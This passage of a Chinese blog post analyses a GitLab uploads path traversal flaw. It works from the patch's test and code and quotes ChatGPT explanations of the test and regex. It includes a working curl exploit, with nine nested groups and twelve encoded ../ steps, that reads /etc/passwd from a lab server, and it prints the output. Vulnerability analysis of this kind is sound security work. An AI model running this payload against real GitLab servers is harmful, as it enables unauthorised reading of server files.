&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> it &lt;span style="color:#e6db74">&amp;#39;responds with status 400&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check files do indeed exists&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> upload_absolute_path &lt;span style="color:#f92672">=&lt;/span> Pathname&lt;span style="color:#f92672">(&lt;/span>upload.absolute_path&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> expect&lt;span style="color:#f92672">(&lt;/span>upload_absolute_path&lt;span style="color:#f92672">)&lt;/span>.to be_exist
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attacked_file_path &lt;span style="color:#f92672">=&lt;/span> upload_absolute_path.dirname.join&lt;span style="color:#f92672">(&lt;/span>filename&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> expect&lt;span style="color:#f92672">(&lt;/span>attacked_file_path&lt;span style="color:#f92672">)&lt;/span>.to be_exist
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get show_path.sub&lt;span style="color:#f92672">(&lt;/span>File.basename&lt;span style="color:#f92672">(&lt;/span>upload.path&lt;span style="color:#f92672">)&lt;/span>, escaped_filename&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> expect&lt;span style="color:#f92672">(&lt;/span>response&lt;span style="color:#f92672">)&lt;/span>.to have_gitlab_http_status&lt;span style="color:#f92672">(&lt;/span>:bad_request&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> end
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>end
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ChatGPT回答：&lt;/p>
&lt;pre tabindex="0">&lt;code>这段Ruby代码定义了一个RSpec共享示例，名为“uploads actions”，它包含一个测试用例。这个测试用例测试了在文件名参数中发生文件遍历攻击时服务器的响应行为。
在测试用例中，首先定义了两个变量：filename和escaped_filename。filename变量是一个字符串，它代表将被攻击的文件名。escaped_filename变量是对filename进行URL编码后的结果，这是为了避免请求URL中使用不安全的字符可能会导致意外的结果。
然后，该测试用例检查上传的文件是否存在，之后构造一个恶意URL请求来执行文件遍历攻击，请求一个非法文件。具体而言，它使用Pathname类来获取上传文件的绝对路径，然后使用File.basename和String#sub方法来构造恶意URL请求。最后，使用RSpec的expect语句来检查服务器的响应状态码是否为400（bad_request）。
总之，这个RSpec共享示例测试了服务器是否能够防止文件遍历攻击，并正确地处理恶意请求。
&lt;/code>&lt;/pre>&lt;p>根据有限的知识结合ChatGPT回答，可以知道这段代码首先定义了目录穿越的payload：&lt;code>../../../../../../../../../Gemfile.lock&lt;/code> 而后将其进行url编码并赋值给escaped_filename。&lt;/p>
&lt;p>之后将上传目录的路径和这个payload拼接并判断这个路径是否存在。之后通过String.sub函数将上传路径的文件名替换成了escaped_filename，并用&lt;code>RSpec&lt;/code> 框架的get函数发起请求。&lt;/p>
&lt;p>结合该单元测试的注释，可以知道，大概payload如下&lt;/p>
&lt;pre tabindex="0">&lt;code>/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># Uploads in tests are stored in directories like:
# tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET
&lt;/code>&lt;/pre>&lt;p>在通过官方文档知道如何通过API上传附件&lt;/p>
&lt;pre tabindex="0">&lt;code>curl --request POST --header &amp;#34;PRIVATE-TOKEN: &amp;lt;your_access_token&amp;gt;&amp;#34; \
--form &amp;#34;file=@dk.png&amp;#34; &amp;#34;https://gitlab.example.com/api/v4/projects/5/uploads&amp;#34;
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>
&lt;a href="https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file" target="_blank">https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>这里先用Administrator上传一个附件看看（已提前建好相应的组和项目）&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl --request POST --header &amp;#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR&amp;#34; --form &amp;#34;file=@3.txt&amp;#34; &amp;#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads&amp;#34;
{&amp;#34;alt&amp;#34;:&amp;#34;3.txt&amp;#34;,&amp;#34;url&amp;#34;:&amp;#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt&amp;#34;,&amp;#34;full_pat
h&amp;#34;:&amp;#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx
t&amp;#34;,&amp;#34;markdown&amp;#34;:&amp;#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)&amp;#34;}
&lt;/code>&lt;/pre>&lt;p>可以看到已经返回了一个url，不难看出和单元测试里面的注释的路径长得很像，这里用自己的payload替换3.txt&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
n
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
&lt;/code>&lt;/pre>&lt;p>&lt;strong>分析&lt;/strong>&lt;/p>
&lt;p>到现在有两个问题&lt;/p>
&lt;ol>
&lt;li>为什么要求payload需要经过url编码&lt;/li>
&lt;li>为什么要12个穿越符才能到根目录&lt;/li>
&lt;li>在哪个代码触发的漏洞&lt;/li>
&lt;/ol>
&lt;p>首先是第一个问题，GitLab架构为&lt;code>nginx ↔Workhorse↔puma&lt;/code>，起初以为将目录穿越进行url编码是绕过nginx解析，举个例子，当访问&lt;code>/1/2/3/4/5/6/../../../index.php&lt;/code>时nginx实际会访问/1/2/3/index.php，即会进行拼接然后访问，所以一开始判断的是将payload进行url编码绕过这个过程，而后和其他师傅讨论才发现，虽然将payload进行编码但nginx会将url里面url编码的部分进行解码然后拼接，所以url编码不是为了绕过nginx解析。在前面使用api上传文件时，文档特别强调了上传目标路径需要进行url编码，这里推测应该是GitLab内会进行url解码在进行处理。&lt;/p>
&lt;p>第二个问题为什么需要12个穿越符，经过测试发现文件实际上传在&lt;code>/var/opt/gitlab/gitlab-rails/uploads/@hashed&lt;/code> 目录下，但在代码中使用的是&lt;code>/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/&lt;/code> 其中&lt;code>uploads&lt;/code>软连接到了&lt;code>/var/opt/gitlab/gitlab-rails/uploads&lt;/code>目录，在上传一个文件后，文件路径为&lt;code>/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt&lt;/code> 不难看出共有12层目录所以需要12个穿越符，在触发漏洞时url为&lt;code>/path/to/group/project/uploads/@hashed&lt;/code>，结合绕过nginx解析，所以至少需要9个组才能有足够的嵌套层数绕过nginx的url解析。&lt;/p>
&lt;p>第三个问题，回到补丁对比，补丁主要在以下两个文件添加了防护目录穿越的代码，在show方法处对filename进行url解码而后调用 &lt;code>Gitlab::Utils.check_path_traversal!(params[:filename])&lt;/code> 检查url解码后的参数是否存在目录穿越。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>app\uploaders\object_storage&lt;span style="color:#f92672">.&lt;/span>rb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">retrieve_from_store!&lt;/span>(identifier)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">Gitlab&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>check_path_traversal!(identifier)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># We need to force assign the value of @filename so that we will still&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># get the original_filename in cases wherein the file points to a random generated&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># path format. This happens for direct uploaded files to final location.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># If we don&amp;#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># to the value of uploader.file.filename which will then contain the random generated path.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># The `identifier` variable contains the value of the `file` column which is the original_filename.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># In cases wherein we are not uploading to final location, it is still fine to set the&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># @filename with the `identifier` value because it still contains the original filename from the `file` column,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># which is what we want in either case.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> @filename &lt;span style="color:#f92672">=&lt;/span> identifier &lt;span style="color:#75715e"># rubocop: disable Gitlab/ModuleWithInstanceVariables&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">super&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app\controllers\concerns\uploads_actions&lt;span style="color:#f92672">.&lt;/span>rb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">show&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">Gitlab&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>check_path_traversal!(params&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">:filename&lt;/span>&lt;span style="color:#f92672">]&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_404 &lt;span style="color:#66d9ef">unless&lt;/span> uploader&lt;span style="color:#f92672">&amp;amp;.&lt;/span>exists?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ttl, directives &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>cache_settings
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ttl &lt;span style="color:#f92672">||=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> directives &lt;span style="color:#f92672">||=&lt;/span> { &lt;span style="color:#66d9ef">private&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#e6db74">must_revalidate&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> expires_in ttl, directives
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file_uploader &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">[&lt;/span>uploader, &lt;span style="color:#f92672">*&lt;/span>uploader&lt;span style="color:#f92672">.&lt;/span>versions&lt;span style="color:#f92672">.&lt;/span>values&lt;span style="color:#f92672">].&lt;/span>find &lt;span style="color:#66d9ef">do&lt;/span> &lt;span style="color:#f92672">|&lt;/span>version&lt;span style="color:#f92672">|&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version&lt;span style="color:#f92672">.&lt;/span>filename &lt;span style="color:#f92672">==&lt;/span> params&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">:filename&lt;/span>&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> render_404 &lt;span style="color:#66d9ef">unless&lt;/span> file_uploader
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> workhorse_set_content_type!
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_upload(file_uploader, &lt;span style="color:#e6db74">attachment&lt;/span>: file_uploader&lt;span style="color:#f92672">.&lt;/span>filename, &lt;span style="color:#e6db74">disposition&lt;/span>: content_disposition)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再来看&lt;code>Gitlab::Utils.check_path_traversal&lt;/code>函数，其定义在&lt;code>lib\gitlab\utils.rb&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">check_path_traversal!&lt;/span>(path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">unless&lt;/span> path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path &lt;span style="color:#f92672">=&lt;/span> path&lt;span style="color:#f92672">.&lt;/span>to_s &lt;span style="color:#66d9ef">if&lt;/span> path&lt;span style="color:#f92672">.&lt;/span>is_a?(&lt;span style="color:#66d9ef">Gitlab&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">HashedPath&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#66d9ef">PathTraversalAttackError&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Invalid path&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">unless&lt;/span> path&lt;span style="color:#f92672">.&lt;/span>is_a?(String)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path &lt;span style="color:#f92672">=&lt;/span> decode_path(path)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path_regex &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">%r{(\A(\.{1,2})\z|\A\.\.[/\\]|[/\\]\.\.\z|[/\\]\.\.[/\\]|\n)}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> path&lt;span style="color:#f92672">.&lt;/span>match?(path_regex)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> logger&lt;span style="color:#f92672">.&lt;/span>warn(&lt;span style="color:#e6db74">message&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Potential path traversal attempt detected&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">path&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>path&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#66d9ef">PathTraversalAttackError&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Invalid path&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> path
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个函数接收一个路径，而后用正则表达式进行匹配，如果匹配到了则抛出&lt;code>PathTraversalAttackError&lt;/code> 错误，把这段正则表达式给ChatGPT，给出了如下解释，所以代码调用这个函数可以检查是否存在恶意的目录穿越。&lt;/p>
&lt;pre tabindex="0">&lt;code>这个正则表达式也是用来匹配文件路径字符串中的相对路径（如&amp;#34;./&amp;#34;、&amp;#34;../&amp;#34;等）的，它的含义与前一个问题中的正则表达式非常相似，只是使用了不同的语法来表示相同的含义。具体来说，这个正则表达式的含义如下：
json
\A 匹配字符串的开头
(.{1,2}) 匹配一个或两个任意字符，并将其作为一个分组
\z 匹配字符串的结尾
| 或
\A..\[/\\] 匹配以&amp;#34;../&amp;#34;开头的字符串
| 或
[/\\]..\z 匹配以&amp;#34;/..&amp;#34;结尾的字符串
| 或
[/\\]..\[/\\] 匹配&amp;#34;/../&amp;#34;或&amp;#34;\..\&amp;#34;这样以&amp;#34;/&amp;#34;或&amp;#34;\&amp;#34;开头且以&amp;#34;/&amp;#34;或&amp;#34;\&amp;#34;结尾的字符串
| 或
\n 匹配换行符
) 分组结束
其中，\A、\z和\n分别代表字符串的开头、结尾和换行符，|表示或的关系，[/\\]用来匹配&amp;#34;&amp;#34;或&amp;#34;/&amp;#34;这两种目录分隔符，因为在不同的操作系统中，目录分隔符是不同的。
这个正则表达式的作用是匹配一个相对路径字符串，用来检测是否存在不合法的相对路径，例如路径中包含超出根目录的&amp;#34;../&amp;#34;或者&amp;#34;..&amp;#34;这样的字符串，或者以&amp;#34;../&amp;#34;开头或以&amp;#34;/..&amp;#34;结尾。如果匹配成功，说明该路径存在不合法的相对路径，需要进行处理或报错。
&lt;/code>&lt;/pre>&lt;p>补丁还以下路径新增了文件，不难看出是在定义了module和upload对象，而后定义了一个字符串show_path并把它传给了&lt;code>config/routes/uploads.rb&lt;/code>执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>spec\requests\uploads_controller_spec&lt;span style="color:#f92672">.&lt;/span>rb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>require &lt;span style="color:#e6db74">&amp;#39;spec_helper&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">RSpec&lt;/span>&lt;span style="color:#f92672">.&lt;/span>describe &lt;span style="color:#66d9ef">UploadsController&lt;/span>, &lt;span style="color:#e6db74">feature_category&lt;/span>: &lt;span style="color:#e6db74">:shared&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">include&lt;/span> &lt;span style="color:#66d9ef">WorkhorseHelpers&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> it_behaves_like &lt;span style="color:#e6db74">&amp;#39;uploads actions&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> let_it_be(&lt;span style="color:#e6db74">:model&lt;/span>) { create(&lt;span style="color:#e6db74">:personal_snippet&lt;/span>, &lt;span style="color:#e6db74">:public&lt;/span>) }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> let_it_be(&lt;span style="color:#e6db74">:upload&lt;/span>) { create(&lt;span style="color:#e6db74">:upload&lt;/span>, &lt;span style="color:#e6db74">:personal_snippet_upload&lt;/span>, &lt;span style="color:#e6db74">:with_file&lt;/span>, &lt;span style="color:#e6db74">model&lt;/span>: model) }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># See config/routes/uploads.rb&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> let(&lt;span style="color:#e6db74">:show_path&lt;/span>) &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/uploads/-/system/&lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>model&lt;span style="color:#f92672">.&lt;/span>model_name&lt;span style="color:#f92672">.&lt;/span>singular&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/&lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>model&lt;span style="color:#f92672">.&lt;/span>to_param&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/&lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>upload&lt;span style="color:#f92672">.&lt;/span>secret&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">/&lt;/span>&lt;span style="color:#e6db74">#{&lt;/span>&lt;span style="color:#66d9ef">File&lt;/span>&lt;span style="color:#f92672">.&lt;/span>basename(upload&lt;span style="color:#f92672">.&lt;/span>path)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>config/routes/uploads.rb&lt;/code>中，定义了路由匹配规则用来处理上传文件和显示文件的请求，结合&lt;code>spec\requests\uploads_controller_spec.rb&lt;/code>的内容可以知道应该是在处理路由&lt;code>get '-/system/:model/:id/:secret/:filename'&lt;/code>时，将文件名传给uploads模块的show方法触发漏洞。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>config&lt;span style="color:#f92672">/&lt;/span>routes&lt;span style="color:#f92672">/&lt;/span>uploads&lt;span style="color:#f92672">.&lt;/span>rb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scope &lt;span style="color:#e6db74">path&lt;/span>: &lt;span style="color:#e6db74">:uploads&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Note attachments and User/Group/Project/Topic avatars&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#34;-/system/:model/:mounted_as/:id/:filename&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;uploads#show&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">%r{note|user|group|project|projects\/topic|achievements\/achievement}&lt;/span>, &lt;span style="color:#e6db74">mounted_as&lt;/span>: &lt;span style="color:#e6db74">/avatar|attachment/&lt;/span>, &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># show uploads for models, snippets (notes) available for now&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#39;-/system/:model/:id/:secret/:filename&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;uploads#show&amp;#39;&lt;/span>,
